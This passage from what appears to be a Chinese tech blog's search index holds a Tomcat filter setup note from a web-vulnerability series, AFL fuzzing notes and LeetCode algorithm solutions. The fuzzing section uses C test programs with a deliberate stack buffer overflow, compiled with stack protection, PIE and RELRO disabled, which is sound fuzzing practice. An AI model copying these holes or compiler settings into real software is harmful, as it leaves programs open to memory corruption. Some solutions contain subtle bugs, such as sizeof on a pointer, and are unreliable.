(seebug.org)](https://paper.seebug.org/1441/#1jsp-webshell)\n\n![image-20221122181418299](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221122181418299.png)\n\n然后简单构建一下环境\n\n- 创建项目\n\n![image-20221122174929458](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221122174929458.png)\n\n- 添加一下`Web`框架\n\n  ![image-20221122175006785](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221122175006785.png)\n\n  ![](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221122175139870.png)\n\n- 导入对应`Tomcat`的`servlet-api`依赖\n\n  ![image-20221122175223681](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221122175223681.png)\n\n  ![image-20221122175306009](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221122175306009.png)\n\n  ![image-20221122175623013](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221122175623013.png)\n\n- 然后就可以创建`Servlet-Filter`\n\n  ![image-20221122175715777](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221122175715777.png)\n\n- 创建之后需要在`web/WEB-INF/web.xml`中加入创建的`filter`\n\n  ![image-20221122175937704](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221122175937704.png)\n\n  这里设置了`url-pattern`为`/*`，表示所有的`url`都会经过该`filter`\n\n- 然后配置一下`Tomcat`服务器即可\n\n  ![image-20221122180133583](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221122180133583.png)\n\n  ![image-20221122180208208](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221122180208208.png)\n\n  ![image-20221122180232020](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221122180232020.png)\n\n- 相关代码\n\n  ![image-20221122180706555](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221122180706555.png)\n\n  - `Servlet`\n\n    ```java\n    import javax.servlet.*;\n    import javax.servlet.http.*;\n    import javax.servlet.annotation.*;\n    import java.io.IOException;\n    \n    @WebServlet(name = \"Servlet\", value = \"/Servlet\")\n    public class Servlet extends HttpServlet {\n        @Override\n        protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n            response.getWriter().write(\"MyServlet\");\n        }\n    \n        @Override\n        protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n    \n        }\n    }\n    ```\n\n  - `MyFilter`\n\n    ```java\n    import javax.servlet.*;\n    import javax.servlet.annotation.*;\n    import java.io.IOException;\n    \n    @WebFilter(filterName = \"MyFilter\")\n    public class MyFilter implements Filter {\n        public void init(FilterConfig config) throws ServletException {\n    \n        }\n    \n        public void destroy() {\n        }\n    \n        @Override\n        public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws ServletException, IOException {\n            response.getWriter().write(\"MyFilter\");\n            chain.doFilter(request, response);\n        }\n    }\n    \n    ```\n\n    \n\n- 运行起来即可看到\n\n  任意存在的`URL`访问都会执行设置的`MyFilter`，\n\n  ![image-20221122180751396](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221122180751396.png)\n\n  ![image-20221122180802377](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221122180802377.png)\n\n当然一般是给对应的`Servlet`来对应的`filter`，修改一下`web.xml`里的`url-pattern`即可\n\n#### ①机制流程\n\n\n\n\n\n\n\n# TIPS\n\n- 在`IDEA`中按两下`shift`键可以快速搜索项目中的类\n\n  ![image-20221122110956487](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221122110956487.png)\n\n","tags":["WEB中间件漏洞"],"categories":["WEB","中间件"]},{"title":"AFL","url":"/2022/09/30/AFL/","content":"\n\n\n# 一、简单测试\n\n```c\nint main(int argc, char const *argv[])\n{\n    int a;\n    char buf[0x20];\n    read(0,&a,4);\n    if(a == 0x1234){\n        printf(\"You get it!\\n\");\n        read(0,buf,0x60);\n    }\n    return 0;\n}\n```\n\n## 1.基础尝试\n\n### (1)白盒\n\n#### ①基础\n\n首先使用简单的`afl-clang-fast`来编译\n\n```\nafl-clang-fast ./test.c -z execstack -fno-stack-protector -no-pie -z norelro -o afl_test\n```\n\n然后跑起来，速度大约是`11.6k`\n\n![image-20220930135610901](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220930135610901.png)\n\n大概跑了6分钟，出现了第一个crash，查看一下，是大小为0x76\n\n![image-20220930140345079](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220930140345079.png)\n\n然后蒸馏一下`afl-tmin -i inputSeed -o outSeed programer` \n\n![image-20220930141806144](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220930141806144.png)\n\n大小变为了`0x2d`，减去开始的4个字节，为`0x29`，再看看IDA反汇编出来的\n\n![image-20220930142125276](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220930142125276.png)\n\n可以看到确实距离`rbp`为`0x28`，多溢出一个字节就可以覆盖到`rbp`了。\n\n此外设置的标志`int v4`也在`buf`上面，而非正常编译的先声明的更靠近栈底。\n\n另外实际`gdb`调试的，其`main`函数栈不再是通过`leave ret`来返回了，而是直接`add rsp 0x38`，而`rbp`为0\n\n![image-20220930142617012](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220930142617012.png)\n\n`main`函数实际的返回地址距离`buf`为`0x28`倒是也能说的过去，就是不知道为什么要这么做。\n\n#### ②尝试__AFL_INIT()\n\n在源码中加入`__AFL_INIT()`，参考：\n\n[sakuraのAFL源码全注释（二）-安全客 - 安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/213431)\n\n[AFL-Training学习记录-安全客 - 安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/254167#h2-3)\n\n`sakura师傅`介绍说，目的是为了在某些情况下可以减少操作系统、链接与libc内部执行程序的成本\n\n`iskindar师傅`介绍说，这是采用`Deferred initialization`的方式来提高AFL的性能，大概提高1.5x，最合适的地方是放在`read`函数前。也就是下面这几行代码。\n\n```c\n#ifdef __AFL_HAVE_MANUAL_CONTROL\n  __AFL_INIT();\n#endif\n```\n\n放入进去\n\n```c\n\nint main(int argc, char const *argv[])\n{\n    int a;\n    char buf[0x20];\n#ifdef __AFL_HAVE_MANUAL_CONTROL\n    __AFL_INIT();\n#endif\n    read(0,&a,4);\n    if(a == 0x1234){\n        printf(\"You get it!\\n\");\n    #ifdef __AFL_HAVE_MANUAL_CONTROL\n        __AFL_INIT();\n    #endif\n        read(0,buf,0x60);\n    }\n    return 0;\n}\n\n```\n\n之后正常编译\n\n```\nafl-clang-fast ./test.c -z execstack -fno-stack-protector -no-pie -z norelro -o afl_test\n```\n\n也相差无几，可能是程序太小，相关的`libc`库调用太少吧\n\n![image-20220930143810066](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220930143810066.png)\n\n发现crash之后蒸馏得到的和不加`__AFL_INIT()`是一样的。\n\n\n\n#### ③尝试__AFL_LOOP(1000)\n\n`persistent`模式，常常用来`fuzz`某些无状态的`API`\n\n`iskindar师傅`介绍说，对于一些无状态的`API`库，可以复用进程来测试多个测试样例，从而减少fork系统调用的使用，进而减少OS的开销。\n\n- 状态：指的是交互过程中保存的会话信息，比如`cookie、session`等\n\n那么无状态的`API`指的就是在这个`API`里没有保存状态了。\n\n先不使用`__AFL_LOOP`\n\n```c\n#include \"noStateAPI.h\"\n\nint main(int argc, char const *argv[])\n{\n    int a;\n    char buf[0x60];\n#ifdef __AFL_HAVE_MANUAL_CONTROL\n   __AFL_INIT();\n#endif\n    read(0,&a,4);\n    //read(0,buf,0x60);\n    vul(&a,buf);\n    return 0;\n}\n```\n\n库如下\n\n```c\n#include \"noStateAPI.h\"\nvoid vul(int* flag,char* data){\n    char buf[0x20];\n    if(*flag == 0x1234){\n        //strcpy(buf,data);\n        read(0,buf,0x60);\n    }\n}\n```\n\n编译加`FUZZ`\n\n```shell\nafl-clang-fast ./testNoLoopAPI.c ./noStateAPI.c -z execstack -fno-stack-protector -no-pie -z norelro -o afl_API_noLoop_test\nafl-fuzz -i otherIn -o afl_API_noLoop_out ./afl_API_noLoop_test\n```\n\n开始运行之后会有`(odd, check syntax!)`，但是运行一段时间后就没有了，不太知道为啥\n\n![image-20220930194310537](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220930194310537.png)\n\n最后大概五六分钟也能得到`crash`\n\n加入`__AFL_LOOP`\n\n```c\n#include \"noStateAPI.h\"\n\nint main(int argc, char const *argv[])\n{\n    int a;\n    char buf[0x60];\n    \n    read(0,&a,4);\n#ifdef __AFL_HAVE_MANUAL_CONTROL\n    while (__AFL_LOOP(1000)) {\n#endif\n        vul(&a,buf);\n#ifdef __AFL_HAVE_MANUAL_CONTROL\n    }   \n#endif\n    return 0;\n}\n```\n\n然后编译`FUZZ`\n\n```shell\nafl-clang-fast ./testAPI.c ./noStateAPI.c -z execstack -fno-stack-protector -no-pie -z norelro -o afl_API_test\nafl-fuzz -i otherIn -o afl_API_out ./afl_API_test\n```\n\n但是这个跑一个小时都没出结果，很奇怪，不知道为什么，难道说有`read`或者有比对值的代码\n\n```c\nif(*flag == 0x1234){\n    //strcpy(buf,data);\n    read(0,buf,0x60);\n}\n```\n\n就代表是有状态的`API`吗\n\n\n\n\n\n### (2)黑盒\n\n此外使用正常的`gcc`编译后，采用黑盒测试时\n\n```shell\nafl-fuzz -Q -i in -o hei_out ./test\n```\n\n速度下降一大截\n\n![image-20220930142948733](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220930142948733.png)\n\n不过还是能够发现`crash`，大概跑了十五六分钟。\n\n![image-20220930144540473](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220930144540473.png)\n\n可以看到大小是`0x4f`，减去标志的4个字节即为`0x4b`，与期待的大概`0x39`字节还是相差一点\n\n![image-20220930144649388](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220930144649388.png)\n\n此外黑盒好像没办法蒸馏\n\n![image-20220930144817799](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220930144817799.png)\n\n\n\n\n\n# 二、变异策略\n\n详见：[AFL文件变异一览 - 记事本 (rk700.github.io)](http://rk700.github.io/2018/01/04/afl-mutations/)\n","tags":["AFL"],"categories":["AFL","AFL"]},{"title":"算法笔记","url":"/2022/09/20/Leecode刷题/","content":"\n\n\n\n\n# LeetCode题目\n\n## 两数之和\n\n给定一个整数数组 nums 和一个整数目标值 target，请你在该数组中找出 和为目标值 target  的那 两个 整数，并返回它们的数组下标。\n\n你可以假设每种输入只会对应一个答案。但是，数组中同一个元素在答案里不能重复出现。\n\n你可以按任意顺序返回答案。\n\n![image-20220911122050526](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220911122050526.png)\n\n遍历`nums`中的元素`num`，`num`索引为i，判定`target-num`这个元素是否在`nums[i+1,len(nums)]`，在则成功\n\n```python\nclass Solution:\n    def twoSum(self, nums: List[int], target: int) -> List[int]:\n        result = []\n        for i in range(len(nums)):\n            flag = target - nums[i]\n            if(flag in nums[i+1:len(nums)]):\n                result.append(i)\n                result.append(nums.index(flag,i+1))\n                break\n        return result\n```\n\nC语言\n\n```c\nint* twoSum(int* nums, int numsSize, int target,int* returnSize){\n    int flag = 0;\n    int* returnArray = (int*)malloc(0x8);\n    for(int i = 0 ; i < numsSize ; i++){\n        flag = target - nums[i];\n        for (int j = i+1 ; j < numsSize ; j++){\n            if(flag == nums[j]){\n                returnArray[0] = i;\n                returnArray[1] = j;\n                *returnSize=2;\n                return returnArray;\n            }\n        }\n    }\n    return returnArray;\n}\n```\n\n\n\n## 回文数\n\n挨个计算其模`10`的余数，打造回文数，判断与原数是否相等\n\n```c\nbool isPalindrome(int x){\n    if(x < 0){\n        return false;\n    }\n    int num = x;\n    long int cur = 0;\n    while( num != 0){\n        cur = cur*10 + num%10;\n        num /= 10;\n    }\n    if(cur == x){\n        return true;\n    }else{\n        return false;\n    }\n}\n```\n\n\n\n## 最长公共前缀\n\n![image-20221012215550610](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221012215550610.png)\n\n```c\nchar * longestCommonPrefix(char ** strs, int strsSize){\n    if(strsSize == 0){\n        return \"\";\n    }\n    for(int j = 0 ; j < strsSize ; j ++){\n        if(sizeof(strs[j]) == 0){\n            return \"\";\n        }\n    }\n    char* ans = strs[0];\n    char* com = malloc(0x200);\n    int flag = 0;\n    int len = 0;\n    for(int i = 0 ; i < sizeof(ans); i ++){\n        flag = 0;\n        for(int j = 0 ; j < strsSize ; j ++){\n            if(ans[i] == strs[j][i]){\n                flag += 1;\n            } else{\n                break;\n            }\n        }\n        if(flag == strsSize){\n            continue;\n        } else{\n            if(i == 0){\n                return \"\";\n            }\n            len = flag;\n            break;\n        }\n    }\n    ans[len] = '\\x00';\n    return ans;\n}\n```\n\n\n\n## 两数相加\n\n![image-20220911184123445](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220911184123445.png)\n\n进位计算，通过`carry = sum / 10;`来获取进位，`sum = sum % 10;`获取进位之后的值，然后用头节点依次串联起来，注意写的时候不要用局部变量当作返回结点，而是再分配一块内存来当作返回结点变量，不然会出错，可能是局部变量被覆盖之类的吧。\n\n[画解算法：2. 两数相加 - 两数相加 - 力扣（LeetCode）](https://leetcode.cn/problems/add-two-numbers/solution/hua-jie-suan-fa-2-liang-shu-xiang-jia-by-guanpengc/)\n\n```c\nstruct ListNode* addTwoNumbers(struct ListNode* l1, struct ListNode* l2){\n    struct ListNode* headNode = (struct ListNode*)malloc(0x10);\n    struct ListNode* curNode = headNode;\n    int carry = 0;\n    int sum = 0;\n    while(l1 != NULL || l2 != NULL) {\n        int x = l1 == NULL ? 0 : l1->val;\n        int y = l2 == NULL ? 0 : l2->val;\n        sum = x + y + carry;\n        carry = sum / 10;\n        sum = sum % 10;\n\n        curNode->next = (struct ListNode*) malloc(0x10);\n        curNode->next->val = sum;\n        curNode->next->next = NULL;\n        curNode = curNode->next;\n\n        if(l1 != NULL)\n            l1 = l1->next;\n        if(l2 != NULL)\n            l2 = l2->next;\n    }\n    if(carry == 1){\n        curNode->next = (struct ListNode*)malloc(0x10);\n        curNode->next->val = carry;\n        curNode->next->next = NULL;\n    }\n    return headNode->next;\n}\n```\n\n\n\n## 字符串转整数\n\n![image-20220912124644320](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220912124644320.png)\n\n自动机\n\n依据每个状态进行转换，即确定所有状态，已经该状态的下个状态都有什么，这里就是如下所示的表格\n\n|           | 空格  | 符号+/- | 数字      | 其他符号 |\n| --------- | ----- | ------- | --------- | -------- |\n| start     | start | signed  | in_number | end      |\n| signed    | end   | end     | in_number | end      |\n| in_number | end   | end     | in_number | end      |\n| end       | end   | end     | end       | end      |\n\n同时编程时设定\n\n- 状态`state`：`start`，`signed`，`in_number`，`end`\n\n- 值`ans`：获取到的数字的值\n- 符号`sign`：`1`为正数、`-1`为负数\n\n```python\nINT_MAX = 2 ** 31 - 1\nINT_MIN = -2 ** 31\n\nclass Automaton:\n    def __init__(self):\n        self.state = 'start'\n        self.sign = 1\n        self.ans = 0\n        self.table = {\n            'start': ['start', 'signed', 'in_number', 'end'],\n            'signed': ['end', 'end', 'in_number', 'end'],\n            'in_number': ['end', 'end', 'in_number', 'end'],\n            'end': ['end', 'end', 'end', 'end'],\n        }\n        \n    def get_col(self, c):\n        if c.isspace():\n            return 0\n        if c == '+' or c == '-':\n            return 1\n        if c.isdigit():\n            return 2\n        return 3\n\n    def get(self, c):\n        self.state = self.table[self.state][self.get_col(c)]\n        if self.state == 'in_number':\n            self.ans = self.ans * 10 + int(c)\n            self.ans = min(self.ans, INT_MAX) if self.sign == 1 else min(self.ans, -INT_MIN)\n        elif self.state == 'signed':\n            self.sign = 1 if c == '+' else -1\n\nclass Solution:\n    def myAtoi(self, str: str) -> int:\n        automaton = Automaton()\n        for c in str:\n            automaton.get(c)\n        return automaton.sign * automaton.ans\n\n```\n\n\n\n\n\n\n\n## 最长回文子串\n\n### 中心扩散法\n\n### 动态规划\n\n首先明确一个字符串，如果首尾两个字符相同，并且去掉这两个字符后的字符串还是回文字符串，那么这个字符串即为回文字符串。\n\n`abcba` -> 去掉首尾`aa` -> `bcb`还是回文字符串，那么该字符串`abcba`即为回文字符串，这样就可以由大化小。\n\n#### 状态设定\n\n首先定义一个二维数组状态`dp[i][j]`即为`str[i:j]`，若其值`dp[i][j]`为`True`，则代表子字符串`str[i:j]`为回文字符串。然后确定最开始的状态表，即最小的元素`dp[i][i]`\n\n| i\\j  | 0    | 1    | 2    | ..   | n    |\n| ---- | ---- | ---- | ---- | ---- | ---- |\n| 0    | True |      |      |      |      |\n| 1    |      | True |      |      |      |\n| 2    |      |      | True |      |      |\n| ..   |      |      |      | True |      |\n| n    |      |      |      |      | True |\n\n一个字符的子字符串一定为`True`，然后依据这个来判断外面的字符串是否为回文字符串。\n\n#### 状态转换方程\n\n由上可得，对应子字符串`str[i:j]`为回文字符串的必要条件为字符串`str[i+1:j-1]`为回文字符串，那么即可从小状态`dp[i+1][j-1]`赋值给大状态`dp[i][j]`\n\n```python\nif(str[i] == str[j]):\n\tdp[i][j] = dp[i+1][j-1]\n```\n\n那么定义完成边界之后，就可以进行相关代码编写了\n\n```python\nmyStr = \"cbdsgfsdaadsas\"\nmyLen = len(myStr)\ndp = [[False] * myLen for _ in range(myLen)]\nmax_len = 1\nbegin = 0\nfor i in range(myLen):\n    dp[i][i] = True\nfor L in range(2,myLen + 1):\n    for i in range(myLen):\n        j = i + L - 1\n        #设定最大右边界\n        if( j >= myLen):\n            break\n        if(myStr[i] != myStr[j]):\n            dp[i][j] = False\n        else:\n            if j-i < 3 :\n                dp[i][j] = True\n            else:\n                dp[i][j] = dp[i+1][j-1]\n        if(dp[i][j] and L > max_len):\n            max_len = L\n            begin = i\nprint(myStr[begin:begin+max_len])\n```\n\n## 无重复字符的最长子串\n\n![image-20220914111707372](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202209141117639.png)\n\n### 滑动窗口\n\n比如一个字符串`str`为`pwwkew`，首先从`str[0]`开始创建一个队列`queue`，其中元素为`str[0]`\n\n- 将`str[1]`加入队列，满足无重复要求\n- 之后将`str[2]`加入队列，发现不满足要求，记录此时的字符串长度为`L`，记下起始位置`i`并且和`max_len`对比取大值。\n- 这时将队首元素`str[0]`移出队列，发现还是不满足要求，再将新的队首元素`str[1]`移出队列，发现满足要求了，接着循环\n- 将`str[3]`加入队列，满足要求，依次循环\n\n每一步大概如下\n\n![123](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202209140930864.png)\n\n在加入队列不满足要求的时候记录此时的其实位置`i`和字符串长度`L`来取值比较即可\n\n```java\nclass Solution {\n    public int lengthOfLongestSubstring(String s) {\n        Set<Character> queue = new HashSet<Character>();\n        int n = s.length();\n        int rightPoint = 0, max_len = 0;\n        int L = 0;\n        for(int i = 0 ; i < n ; i ++){\n            while (  (rightPoint < n) && !queue.contains(s.charAt(rightPoint))){\n                queue.add(s.charAt(rightPoint));\n                rightPoint++;\n            }\n            L = rightPoint-i;\n            if(L > max_len){\n                max_len = L;\n            }\n            if(rightPoint < n -1){\n                if(i == 0){\n                    queue.remove(s.charAt(0));\n                }else {\n                    queue.remove(s.charAt(i));\n                }\n            }else {\n                return max_len;\n            }\n        }\n        return max_len;\n\n    }\n}\n```\n\n## 岛屿数量\n\n![image-20220914111803102](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202209141118246.png)\n\n### 深度优先搜索DFS\n\n类似如下所示，遍历顺序为黄->紫->红->绿->蓝\n\n![DFS](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202209141201011.png)\n\n即依据一个结点，从该结点的上下左右往外扩散遍历所有结点，遇到一个结点就进去遍历，核心思想是发现结点，先进再说。\n\n```python\nclass Solution:\n    def numIslands(self, grid: [[str]]) -> int:\n        count = 0\n        def dfs(grid,i,j):\n            #表示该结点已经遍历过了\n            grid[i][j] = '0'\n            if((i-1 >= 0) and grid[i-1][j] == '1'):\n                dfs(grid,i-1,j)\n            if((i+1 < len(grid)) and grid[i+1][j] == '1'):\n                dfs(grid,i+1,j)\n            if((j-1 >= 0) and grid[i][j-1] == '1'):\n                dfs(grid,i,j-1)\n            if((j+1 < len(grid[0])) and grid[i][j+1] == '1'):\n                dfs(grid,i,j+1)\n\n        for i in range(0,len(grid)):\n            for j in range(0,len(grid[0])):\n                if(grid[i][j] == '1'):\n                    dfs(grid,i,j)\n                    count = count + 1\n        return count\n```\n\n### 广度优先搜索BFS\n\n类似如下所示，遍历顺序同样为黄->紫->红->绿->蓝，相当于是一层一层的\n\n![BFS](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202209141357212.png)\n\n但是这样就需要用到一个队列，从一个结点出发的下一层都放到该队列尾部，然后从队首取结点，再遍历，将该结点的下一层也放入队列尾部，依次循环。\n\n有点像将一个结点的出口点全面存储起来放到一个队列的最后一起进行遍历\n\n```python\nclass Solution:\n    def numIslands(self, grid: [[str]]) -> int:\n        count = 0\n        def bfs(grid,i,j):\n            queue = [[i,j]]\n            while queue:\n                [i,j] = queue.pop(0)\n                #可能存在放入队列的重复结点，所以需要再判断\n                if(grid[i][j] == '1'):\n                    grid[i][j] = '0'\n                    if((i-1 >= 0) and grid[i-1][j] == '1'):\n                        queue.append([i-1,j])\n                    if((i+1 < len(grid)) and grid[i+1][j] == '1'):\n                        queue.append([i+1,j])\n                    if((j-1 >= 0) and grid[i][j-1] == '1'):\n                        queue.append([i,j-1])\n                    if((j+1 < len(grid[0])) and grid[i][j+1] == '1'):\n                        queue.append([i,j+1])\n\n        for i in range(0,len(grid)):\n            for j in range(0,len(grid[0])):\n                if(grid[i][j] == '1'):\n                    bfs(grid,i,j)\n                    count = count + 1\n        return count\n```\n\n## 盛最多水的容器\n\n贪心算法、双指针\n\n![image-20220914165747824](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202209141657084.png)\n\n确定两个指针从头尾开始，依次往中间收缩，由于是装水容量由短板决定，所以对于例子`container[0:8]`组成的容器来说，左指针对应高度小于右指针对应高度，所以右指针如果往左移动，其容量只会减少。那么我们就尝试将左指针往右移动，企图寻找更大的容器。\n\n其证明感觉没见到几个讲的很清楚的。\n\n这里需要明白一点，最大的容器左右边界之外如果还有边界，那么外面的边界的最大值一定比这个最大容器的短板更短，如果更长，那么挪过去之后，肯定容器更大了。\n\n```python\nclass Solution:\n    def maxArea(self, height: List[int]) -> int:\n        i = 0\n        res = 0\n        j = len(height)-1\n        while i < j:\n            if(height[i] < height[j]):\n                res = max(res,height[i]*(j-i))\n                i += 1\n            else:\n                res = max(res,height[j] * (j-i))\n                j -= 1\n        return res\n```\n\n\n\n([)]\n\n\n\n## 螺旋矩阵\n\n### 自动机\n\n|       | number | 符号##/边界 |\n| ----- | ------ | ----------- |\n| right | right  | down        |\n| down  | down   | left        |\n| left  | left   | up          |\n| up    | up     | right       |\n\n由此写出自动机相关代码\n\n```python\n\nclass Automaton:\n    def __init__(self,matrix):\n        self.matrix = matrix\n        self.state = 'right'\n        self.i = 0\n        self.j = -1\n        self.myList = []\n        self.table = {\n            'right': ['right', 'down'],\n            'down': ['down', 'left'],\n            'left': ['left', 'up'],\n            'up': ['up', 'right'],\n        }\n\n\n    def get_col(self,i,j):\n        if  j >= len(self.matrix[0]) or (i >= len(self.matrix)) or (j < 0) or (i < 0):\n            return 1\n        if self.matrix[i][j] == '#':\n            return 1\n        if isinstance(self.matrix[i][j],int):\n            return 0\n\n\n    def nextState(self,i,j):\n        if (self.state == \"right\"):\n            j += 1\n        if (self.state == \"down\"):\n            i += 1\n        if (self.state == \"left\"):\n            j -= 1\n        if (self.state == \"up\"):\n            i -= 1\n        self.state = self.table[self.state][self.get_col(i,j)]\n\n    def start(self):\n        for i in range(len(self.matrix)*len(self.matrix[0])):\n            self.nextState(self.i,self.j)\n            if(self.state == \"right\"):\n                self.j += 1\n            if(self.state == \"down\"):\n                self.i += 1\n            if(self.state == \"left\"):\n                self.j -= 1\n            if(self.state == \"up\"):\n                self.i -= 1\n            self.myList.append(self.matrix[self.i][self.j])\n            self.matrix[self.i][self.j] = '#'\n\nclass Solution:\n    def spiralOrder(self, matrix: List[List[int]]) -> List[int]:\n        test = Automaton(matrix)\n        test.start()\n        return test.myList\n```\n\n\n\n另一个方法是获取依照层进行遍历，当遍历完一层之后，去掉外层，然后再遍历。\n\n`(top,left)、(top,right)、(bottom,left)、(bottom,right)`为矩阵边界点，每次遍历完一层之后，对相应的结点数据进行增减。\n\n## 二叉树最大深度\n\n### 深度优先动态规划\n\n明确一个公式\n\n`deepth(root) = max(deepth(root.rigth),deepth(root.left)) + 1`\n\n即每一个二叉树的深度等于其左子树和右子树中的最大深度再加上根节点，然后其左子树和右子树又可以被当作一个新的二叉树来进行获得其深度，类似动态规划的递归写法。\n\n```python\n# Definition for a binary tree node.\n# class TreeNode:\n#     def __init__(self, val=0, left=None, right=None):\n#         self.val = val\n#         self.left = left\n#         self.right = right\nclass Solution:\n    def maxDepth(self, root: Optional[TreeNode]) -> int:\n        if(root is None):\n            return 0\n        else:\n            return max(self.maxDepth(root.right),self.maxDepth(root.left)) + 1\n```\n\n\n\n## 不同的二叉搜索树\n\n![image-20220916201554961](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202209162015127.png)\n\n### 动态规划\n\n- 假设G(n)为n个结点的所有二叉搜索树个数\n- 假设f(i)为以i为根节点的所有二叉搜索树个数\n\n- 那么可以得出\n\n  `G(n)=f(1)+f(2)+f(3)+f(4)+...+f(n)`\n\n- 而对于`f(i)`，有\n\n  `f(i) = G(i-1)*G(n-i)`\n\n- 推导得出卡特兰数公式：\n\n  `G(n)=G(0)∗G(n−1)+G(1)∗G(n−2)+...+G(n−1)∗G(0)`\n\n- 依据该公式，将每一项的展开\n  - G(0) = 1;\n  - G(1) = 1;\n  - G(2) = `G(0)∗G(1) + G(1)∗G(0)`\n  - G(3) = `G(0)∗G(2) + G(1) * G(1) + G(2)*G(0)`\n\n依次类推，最开始时需要的元素为G(0)和G(1)可以推导得出其他所有的G(n)，依据卡特兰公式即可得到状态转移方程\n\n```python\nclass Solution:\n    def numTrees(self, n: int) -> int:\n        dp = [0]*(n+1)\n        dp[0] = 1\n        dp[1] = 1\n        for i in range(2,n+1):\n            for j in range(0,i):\n                dp[i] += dp[j]*dp[i-1-j]\n        return dp[n]\n```\n\n\n\n## 数组中的第K个最大元素\n\n### 堆排序\n\n#### 建堆\n\n```c\nint array[10] = {3,4,5,2,1,3,4,2,2,1,};\n```\n\n构建大顶堆，首先依据顺序排列成二叉完全树\n\n![image-20220920165048440](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202209201650690.png)\n\n然后从`idx`最大的非叶子结点的子树开始，这里就是`idx=4`，计算方法为一个循环来大概判断\n\n```c\nint i = heapSize/2\n```\n\n然后获取取左右子树的根结点，二叉树基本原理\n\n```c\nint leftIdx = i * 2 + 1;\nint rightIdx = i * 2 + 2;\n```\n\n之后进行判断排序，获取最大的进行交换调整，将大的上移，然后将下移的结点作为一个二叉树根节点继续调整，依次循环\n\n```c\nint maxIdx = rootIdx;\nif( leftIdx < heapSize && array[leftIdx] > array[maxIdx]){\n    maxIdx = leftIdx;\n}\nif( rightIdx < heapSize && array[rightIdx] > array[maxIdx]){\n    maxIdx = rightIdx;\n}\nif( maxIdx != rootIdx){\n    int tmp = array[rootIdx];\n    array[rootIdx] = array[maxIdx];\n    array[maxIdx] = tmp;\n    maxJustHeap(array,maxIdx,heapSize);\n}\n```\n\n完整代码为\n\n```c\nvoid maxJustHeap(int* array,int rootIdx,int heapSize){\n    int leftIdx = rootIdx * 2 + 1;\n    int rightIdx = rootIdx * 2 + 2;\n    int maxIdx = rootIdx;\n    if( leftIdx < heapSize && array[leftIdx] > array[maxIdx]){\n        maxIdx = leftIdx;\n    }\n    if( rightIdx < heapSize && array[rightIdx] > array[maxIdx]){\n        maxIdx = rightIdx;\n    }\n    if( maxIdx != rootIdx){\n        int tmp = array[rootIdx];\n        array[rootIdx] = array[maxIdx];\n        array[maxIdx] = tmp;\n        maxJustHeap(array,maxIdx,heapSize);\n    }\n}\n\n\nvoid buildMaxHeap(int* array,int heapSize){\n    for(int i = heapSize/2 ; i >= 0; i--){\n        maxJustHeap(array,i,heapSize);\n    }\n}\nint main() {\n    int array[10] = {3,4,5,2,1,3,4,2,2,1,};\n    buildMaxHeap(array,10);\n    return 0;\n}\n```\n\n完整过程为\n\n![image-20220920165930745](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202209201659876.png)\n\n\n\n![image-20220920165959673](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202209201659777.png)\n\n\n\n![image-20220920170022172](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202209201700284.png)\n\n![image-20220920170058770](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202209201700879.png)\n\n\n\n![image-20220920170115745](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202209201701842.png)\n\n\n\n![image-20220920170141740](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202209201701841.png)\n\n即可完成最终调整\n\n![image-20220920170311277](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202209201703394.png)\n\n### 删除\n\n之后删除掉`K-1`个堆顶元素剩下的堆，即可得到第`K`个大小的元素。但是堆的删除操作也有点复杂，参照[(46条消息) 